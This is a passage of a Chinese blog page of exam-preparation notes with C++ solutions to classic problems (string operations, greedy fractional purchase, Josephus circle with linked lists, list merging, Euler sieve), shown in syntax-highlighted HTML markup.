class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="查找">查找</h2><p>可以sort+二分，也可以用map（和python的dic有点类似）</p><h3 id="查找---北邮">查找 - 北邮</h3><h5 id="题目描述-2">题目描述</h5><p>读入一组字符串（待操作的），再读入一个intn记录记下来有几条命令，总共有2中命令：1、翻转从下标为i的字符开始到i+len-1之间的字符串倒序；2、替换命中如果第一位为1，用命令的第四位开始到最后的字符串替换原读入的字符串下标i 到i+len-1的字符串。每次执行一条命令后新的字符串代替旧的字符串（即下一条命令在作用在得到的新字符串上）。命令格式：第一位0代表翻转，1代表替换；第二位代表待操作的字符串的起始下标inti；第三位表示需要操作的字符串长度int len。</p><h5 id="输入输出格式-1">输入输出格式</h5><h6 id="输入描述-3">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入有多组数据。</span><br><span class="line">每组输入一个字符串（不大于<span class="number">100</span>）然后输入<span class="built_in">n</span>，再输入<span class="built_in">n</span>条指令（指令一定有效）。</span><br></pre></td></tr></table></figure><h6 id="输出描述-3">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据指令对字符串操作后输出结果。</span><br></pre></td></tr></table></figure><p>字符串操作，主要用substr</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string str;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; str)&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">string opt, tmp, r;</span><br><span class="line"><span class="type">int</span> choice, start, len;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; opt;</span><br><span class="line">choice = opt[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">start = opt[<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">len = opt[<span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">tmp = str.<span class="built_in">substr</span>(start, len);</span><br><span class="line"><span class="built_in">reverse</span>(tmp.<span class="built_in">begin</span>(), tmp.<span class="built_in">end</span>());</span><br><span class="line">r = str.<span class="built_in">substr</span>(<span class="number">0</span>, start) + tmp + str.<span class="built_in">substr</span>(start+len);</span><br><span class="line">str = r;</span><br><span class="line">cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp = opt.<span class="built_in">substr</span>(<span class="number">3</span>);</span><br><span class="line">r = str.<span class="built_in">substr</span>(<span class="number">0</span>, start) + tmp + str.<span class="built_in">substr</span>(start+len);</span><br><span class="line">str = r;</span><br><span class="line">cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="贪心算法">贪心算法</h2><p>当前最优，常用sort。</p><h3 id="喝饮料">喝饮料</h3><h5 id="题目描述-3">题目描述</h5><p>商店里有n中饮料，第i种饮料有mi毫升，价格为wi。</p><p>小明现在手里有x元，他想吃尽量多的饮料，于是向你寻求帮助，怎么样买才能吃的最多。</p><p>请注意，每一种饮料都可以只买一部分。</p><h5 id="输入输出格式-2">输入输出格式</h5><h6 id="输入描述-4">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有多组测试数据。</span><br><span class="line">第一行输入两个非负整数x和<span class="built_in">n</span>。</span><br><span class="line">接下来<span class="built_in">n</span>行，每行输入两个整数，分别为mi和wi。</span><br><span class="line">所有数据都不大于<span class="number">1000</span>。</span><br><span class="line">x和<span class="built_in">n</span>都为-<span class="number">1</span>时程序结束。</span><br></pre></td></tr></table></figure><h6 id="输出描述-4">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请输出小明最多能喝到多少毫升的饮料，结果保留三位小数。</span><br></pre></td></tr></table></figure><p>找出单位价格最多饮料的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">drink</span>&#123;</span><br><span class="line"><span class="type">double</span> m, w;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">struct</span> drink a, <span class="keyword">struct</span> drink b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a.m / a.w) &gt; (b.m / b.w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">double</span> x;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(x == <span class="number">-1</span> &amp;&amp; n == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">struct</span> drink dk[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; dk[i].m &gt;&gt; dk[i].w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(dk, dk+n, cmp);</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> r = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(x &amp;&amp; idx &lt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(x &gt; dk[idx].w)&#123;</span><br><span class="line">x -= dk[idx].w;</span><br><span class="line">r += dk[idx].m;</span><br><span class="line">idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">r += dk[idx].m / dk[idx].w * x;</span><br><span class="line">x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.3lf\n&quot;</span>, r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="链表">链表</h2><h3 id="猴子报数">猴子报数</h3><h5 id="题目描述-4">题目描述</h5><p>n个猴子围坐一圈并按照顺时针方向从1到n编号，从第s个猴子开始进行1到m的报数，报数到第m的猴子退出报数，从紧挨它的下一个猴子重新开始1到m的报数，如此进行下去知道所有的猴子都退出为止。求给出这n个猴子的退出的顺序表。</p><h5 id="输入输出格式-3">输入输出格式</h5><h6 id="输入描述-5">输入描述:</h6><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有做组测试数据．每一组数据有两行，第一行输入n（表示猴子的总数最多为<span class="number">100</span>）第二行输入数据<span class="built_in">s</span>(从第s个猴子开始报数)和数据<span class="built_in">m</span>(第m个猴子退出报数)．当输入０　０　０时表示程序结束．</span><br></pre></td></tr></table></figure><h6 id="输出描述-5">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每组数据的输出结果为一行，中间用逗号间隔。</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *next;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *<span class="built_in">setup</span>(<span class="type">int</span> n)&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *head, *tmp, *pre;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">tmp = (<span class="keyword">struct</span> node *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">1</span>)&#123;</span><br><span class="line">head = tmp;</span><br><span class="line">pre = tmp;</span><br><span class="line">&#125;</span><br><span class="line">tmp-&gt;num = i;</span><br><span class="line">tmp-&gt;next = head;</span><br><span class="line">pre-&gt;next = tmp;</span><br><span class="line">pre = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="keyword">struct</span> node *head, <span class="type">int</span> n, <span class="type">int</span> s, <span class="type">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *p, *pre;</span><br><span class="line">p = head;</span><br><span class="line">s--;</span><br><span class="line"><span class="keyword">while</span>(s)&#123;</span><br><span class="line">pre = p;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">s--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(p == p-&gt;next)&#123;</span><br><span class="line">cout &lt;&lt; p-&gt;num &lt;&lt; endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i % m == <span class="number">0</span>)&#123;</span><br><span class="line">cout &lt;&lt; p-&gt;num &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">pre-&gt;next = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> pre = p;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, s, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; s &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span> &amp;&amp; s == <span class="number">0</span> &amp;&amp; m == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">struct</span> node *head;</span><br><span class="line">head = <span class="built_in">setup</span>(n);</span><br><span class="line"><span class="built_in">print</span>(head, n, s, m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单链表">单链表</h3><h5 id="题目描述-5">题目描述</h5><p>设节点定义如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> Element; <span class="comment">// 节点中的元素为整数类型</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> * Next; <span class="comment">// 指向下一个节点</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>从键盘输入5个整数，将这些整数插入到一个链表中，并按从小到大次序排列，最后输出这些整数。</p><p>直接插入，边插入边比较就行了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> Element; <span class="comment">// 节点中的元素为整数类型</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> * Next; <span class="comment">// 指向下一个节点</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> *head = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">head-&gt;Next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> *p;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">p = head;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> *tmp = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">cin &gt;&gt; tmp-&gt;Element;</span><br><span class="line"><span class="keyword">while</span>(p-&gt;Next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(tmp-&gt;Element &lt; p-&gt;Next-&gt;Element)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">p = p-&gt;Next;</span><br><span class="line">&#125;</span><br><span class="line">tmp-&gt;Next = p-&gt;Next;</span><br><span class="line">p-&gt;Next = tmp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">head = head-&gt;Next;</span><br><span class="line"><span class="keyword">while</span>(head != <span class="literal">NULL</span>)&#123;</span><br><span class="line">cout &lt;&lt; head-&gt;Element &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">head = head-&gt;Next;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="链表合并">链表合并</h2><h5 id="题目描述-6">题目描述</h5><p>给定两个元素有序（从小到大）的链表，要求将两个链表合并成一个有序（从小到大）链表，</p><h5 id="输入输出格式-4">输入输出格式</h5><h6 id="输入描述-6">输入描述:</h6><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一行输入第一个链表的结点数<span class="built_in">S1</span>，<span class="built_in">S1</span>&lt;<span class="number">=100</span>。</span><br><span class="line">第二行输入<span class="built_in">S1</span>个整数，两两之间用空格隔开。</span><br><span class="line">第三行输入第二个链表的结点数<span class="built_in">S2</span>，<span class="built_in">S2</span>&lt;<span class="number">=100</span>。</span><br><span class="line">第四行输入<span class="built_in">S2</span>个整数，两两之间用空格隔开。</span><br></pre></td></tr></table></figure><h6 id="输出描述-6">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出合并之后的链表结果，两两之间用空格隔开，末尾没有空格。</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">    <span class="type">int</span> element; <span class="comment">// 节点中的元素为整数类型</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span> * next; <span class="comment">// 指向下一个节点</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *<span class="built_in">setup</span>(<span class="type">int</span> n)&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *head, *p;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *tmp = <span class="keyword">new</span> node;</span><br><span class="line">cin &gt;&gt; tmp-&gt;element;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">head = tmp;</span><br><span class="line">p = head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;next = tmp;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">struct</span> node *head1, <span class="keyword">struct</span> node *head2)</span></span>&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *head, *p;</span><br><span class="line"><span class="keyword">if</span>(head1-&gt;element &lt; head2-&gt;element)&#123;</span><br><span class="line">head = head1;</span><br><span class="line">head1 = head1-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">head = head2;</span><br><span class="line">head2 = head2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">p = head;</span><br><span class="line"><span class="keyword">while</span>(head1 != <span class="literal">NULL</span> &amp;&amp; head2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(head1-&gt;element &lt; head2-&gt;element)&#123;</span><br><span class="line">p-&gt;next = head1;</span><br><span class="line">head1 = head1-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">p-&gt;next = head2;</span><br><span class="line">head2 = head2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(head1 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">p-&gt;next = head1;</span><br><span class="line">head1 = head1-&gt;next;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(head2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">p-&gt;next = head2;</span><br><span class="line">head2 = head2-&gt;next;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p = head;</span><br><span class="line"><span class="keyword">while</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">cout &lt;&lt; p-&gt;element &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *head1, *head2;</span><br><span class="line">head1 = <span class="built_in">setup</span>(n);</span><br><span class="line">cin &gt;&gt; m;</span><br><span class="line">head2 = <span class="built_in">setup</span>(m);</span><br><span class="line"><span class="built_in">merge</span>(head1, head2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数学">数学</h1><p>记住一些常见的，gcd，lcm， 斐波那契数列</p><h2 id="素数">素数</h2><p>记录一下欧拉筛，用到了vector结构，并且进行函数传参；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">c++</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1020</span>;</span><br><span class="line"><span class="type">bool</span> isnp[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt; &amp;primes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isnp[i])</span><br><span class="line">            primes.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="type">int</span> p = primes[j];</span><br><span class="line">            <span class="keyword">if</span> (p * i &gt; n)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            isnp[p * i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (i % p == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line"><span 